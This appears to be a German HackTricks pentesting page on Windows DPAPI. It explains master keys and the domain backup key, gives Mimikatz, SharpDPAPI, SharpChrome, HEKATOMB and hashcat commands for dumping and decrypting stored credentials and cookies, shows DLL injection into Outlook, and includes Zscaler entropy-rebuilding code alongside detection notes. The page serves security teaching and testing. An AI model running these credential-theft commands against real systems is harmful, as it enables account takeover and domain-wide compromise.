# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet und nutzt dabei entweder Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, da sie Daten mit einem Schlüssel verschlüsseln können, der aus den Anmeldegeheimnissen des Benutzers oder bei Systemverschlüsselung aus den Domain-Authentifizierungsgeheimnissen des Systems abgeleitet wird, sodass Entwickler sich nicht selbst um den Schutz des Verschlüsselungsschlüssels kümmern müssen.

Die gebräuchlichste Nutzung von DPAPI erfolgt über die **`CryptProtectData` und `CryptUnprotectData`** Funktionen, die es Anwendungen ermöglichen, Daten sicher mit der Session des aktuell angemeldeten Prozesses zu verschlüsseln und zu entschlüsseln. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Außerdem akzeptieren diese Funktionen auch einen **`entropy` parameter**, der ebenfalls bei der Verschlüsselung und Entschlüsselung verwendet wird; um also etwas zu entschlüsseln, das unter Verwendung dieses Parameters verschlüsselt wurde, muss derselbe Entropiewert bereitgestellt werden, der bei der Verschlüsselung verwendet wurde.

### Erzeugung des Benutzer-Schlüssels

DPAPI erzeugt einen eindeutigen Schlüssel (genannt **`pre-key`**) für jeden Benutzer, basierend auf dessen Anmeldeinformationen. Dieser Schlüssel wird aus dem Passwort des Benutzers und weiteren Faktoren abgeleitet; der Algorithmus hängt vom Benutzertyp ab, führt aber letztlich zu einem SHA1-basierten Wert. Zum Beispiel hängt er für Domänenbenutzer **vom NTLM-Hash des Benutzers** ab.

Das ist besonders interessant, denn wenn ein Angreifer den Passwort-Hash des Benutzers erlangen kann, kann er:

- **Jede mit DPAPI verschlüsselte Daten** mit dem Schlüssel dieses Benutzers entschlüsseln, ohne eine API kontaktieren zu müssen
- Versuchen, das Passwort offline zu **cracken**, indem er versucht, den gültigen DPAPI-Schlüssel zu erzeugen

Außerdem wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **Master-Schlüssel** erzeugt. Dieser Master-Schlüssel wird tatsächlich zur Verschlüsselung der Daten verwendet. Jeder Master-Schlüssel erhält eine **GUID** (Globally Unique Identifier), die ihn identifiziert.

Die Master-Schlüssel werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier dieses Benutzers ist. Der Master-Schlüssel wird verschlüsselt durch den **`pre-key`** des Benutzers gespeichert und außerdem zur Wiederherstellung durch einen **Domänen-Backup-Schlüssel** verschlüsselt (d.h. derselbe Schlüssel wird zwei Mal mit zwei unterschiedlichen Passwörtern verschlüsselt).

Beachte, dass der **Domänen-Schlüssel, der zum Verschlüsseln des Master-Schlüssels verwendet wird, auf den Domain-Controllern liegt und sich nie ändert**. Wenn ein Angreifer also Zugriff auf den Domain-Controller hat, kann er den Domänen-Backup-Schlüssel abrufen und die Master-Schlüssel aller Benutzer in der Domäne entschlüsseln.

Die verschlüsselten Blobs enthalten die **GUID des Master-Schlüssels**, der zum Verschlüsseln der Daten verwendet wurde, in ihren Headern.

> [!TIP]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master-Schlüssel finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Erzeugung des Machine-/Systemschlüssels

Dies ist der Schlüssel, den die Maschine verwendet, um Daten zu verschlüsseln. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Schlüssel, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird verwendet, um Daten zu verschlüsseln, die vom System selbst zugänglich sein müssen, wie z. B. maschinenweite Anmeldeinformationen oder systemweite Secrets.

Beachte, dass diese Schlüssel **kein Domain-Backup** haben, daher sind sie nur lokal zugänglich:

- **Mimikatz** kann darauf zugreifen, indem es die LSA-Secrets mit dem Befehl `mimikatz lsadump::secrets` ausliest
- Das Secret wird in der Registry gespeichert, daher könnte ein Administrator die **DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registry-Pfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Durch DPAPI geschützte Daten

Zu den persönlichen Daten, die durch DPAPI geschützt werden, gehören:

- Windows-Anmeldedaten
- Passwörter und Autovervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Konto-Passwörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für gemeinsame Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, inklusive Verschlüsselungsschlüsseln
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und weitere
- Verschlüsselte Blobs in der Registry
- ...

Systemgeschützte Daten umfassen:
- WLAN-Passwörter
- Passwörter für geplante Tasks
- ...

### Optionen zum Extrahieren von Master Keys

- Wenn der Benutzer Domain-Admin-Rechte hat, kann er auf den **domain backup key** zugreifen, um alle Master Keys der Benutzer in der Domäne zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, **auf den LSASS-Speicher zuzugreifen**, um die DPAPI-Master-Schlüssel aller angemeldeten Benutzer und den SYSTEM key zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn ein Benutzer lokale Administratorrechte hat, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die machine master keys zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie **die Master Keys des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn du in einer Sitzung als der Benutzer bist, ist es möglich, den DC nach dem **backup key to decrypt the master keys using RPC** zu fragen. Wenn du lokaler Administrator bist und der Benutzer eingeloggt ist, könntest du dafür **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault auflisten
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Typische vom Benutzer **geschützte Dateien** befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfe auch, ob `\Roaming\` in den obigen Pfaden durch `\Local\` ersetzt werden kann.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um mit DPAPI verschlüsselte sensible Daten wie cookies zu entschlüsseln.

### Zugriffsschlüssel und Daten

- **Use SharpDPAPI** um credentials aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung zu extrahieren:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Credentials-Informationen beschaffen** wie die encrypted data und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Zugriff auf masterkeys**:

Entschlüssle einen masterkey eines Benutzers, der den **domain backup key** über RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente zur Masterkey-Entschlüsselung (beachte, dass es möglich ist, `/rpc` zu verwenden, um den Domain-Backup-Schlüssel zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine DPAPI-Domain-Private-Key-Datei anzugeben...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das **SharpDPAPI**-Tool unterstützt außerdem diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass es möglich ist, `/rpc` zu verwenden, um den Domänen-Backup-Schlüssel zu erhalten, `/password`, um ein Klartext-Passwort zu verwenden, `/pvk`, um eine private Schlüsseldatei der DPAPI-Domäne anzugeben, `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Entschlüssele einige Daten unter Verwendung der **aktuellen Benutzersitzung**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Umgang mit optionaler Entropie ("Drittanbieter-Entropie")

Einige Anwendungen übergeben einen zusätzlichen **Entropie**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der korrekte Masterkey bekannt ist. Das Beschaffen der Entropie ist daher unerlässlich, wenn Anmeldeinformationen angegriffen werden sollen, die auf diese Weise geschützt sind (z. B. Microsoft Outlook, einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine Benutzermodus-DLL, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und transparent jede übergebene optionale Entropie aufzeichnet. Das Ausführen von EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` erzeugt eine Datei, die jeden Entropie-Puffer dem aufrufenden Prozess und dem Blob zuordnet. Die erfasste Entropie kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft führte ein **context 3** masterkey-Format ab Windows 10 v1607 (2016) ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes cracking von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher word-list- oder brute-force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann außerdem Credential- und Vault-Blobs parsen, diese mit geknackten Schlüsseln entschlüsseln und Passwörter im Klartext exportieren.


### Auf Daten anderer Maschinen zugreifen

In **SharpDPAPI and SharpChrome** können Sie die **`/server:HOST`**-Option angeben, um auf die Daten einer entfernten Maschine zuzugreifen. Natürlich müssen Sie auf diese Maschine zugreifen können, und im folgenden Beispiel wird vorausgesetzt, dass der **domain backup encryption key** bekannt ist:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des domain controller backup key über RPC automatisiert. Das Script löst anschließend die IP-Adressen aller Computer auf und führt einen smbclient auf allen Computern aus, um alle DPAPI-Blobs aller Benutzer abzuholen und alles mit dem domain backup key zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kann man jedes Subnetz finden, selbst wenn man es zuvor nicht kannte!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch Secrets dumpen, die durch DPAPI geschützt sind. Die 2.x-Version brachte folgende Neuerungen:

* Parallele Sammlung von Blobs von hunderten Hosts
* Parsing von **context 3** masterkeys und automatische Hashcat-Cracking-Integration
* Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
* Ein neuer **`--snapshot`**-Modus, um Endpunkte wiederholt abzufragen und neu erstellte Blobs zu diffen

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für masterkey/credential/vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional Cracken automatisch starten kann. Es unterstützt vollständig Machine- und User-masterkey-Formate bis Windows 11 24H1.


## Common detections

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Besonders über ein Netzwerk-Share wie **C$** oder **ADMIN$**.
- Einsatz von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf LSASS-Speicher zuzugreifen oder masterkeys zu dumpen.
- Event **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Event **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* (Credential Manager) anfordert.

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang konnte ein Domain-Mitglied dazu bringen, einen bösartigen DPAPI backup key abzurufen, was die Entschlüsselung von Benutzer-masterkeys ermöglicht. Im November 2023 im kumulativen Update gepatcht – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.
* **Chrome 127 “App-Bound” cookie encryption** (Juli 2024) ersetzte den legacy DPAPI-only Schutz durch einen zusätzlichen Schlüssel, der im Credential Manager des Benutzers gespeichert wird. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI masterkey als auch den **GCM-wrapped app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im User-Kontext ausgeführt werden.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Machine scope)** verschlüsselt, aber der Anbieter liefert **custom entropy**, die zur Laufzeit *berechnet* wird, statt auf der Festplatte gespeichert zu sein.

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein hartkodiertes Secret, eingebettet in `ZSACredentialProvider.dll`.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, kann **jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung ergibt die vollständige JSON-Konfiguration, einschließlich jeder **device posture check** und ihres erwarteten Werts – Informationen, die beim Versuch von clientseitigen Umgehungen sehr wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.

## Referenzen

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
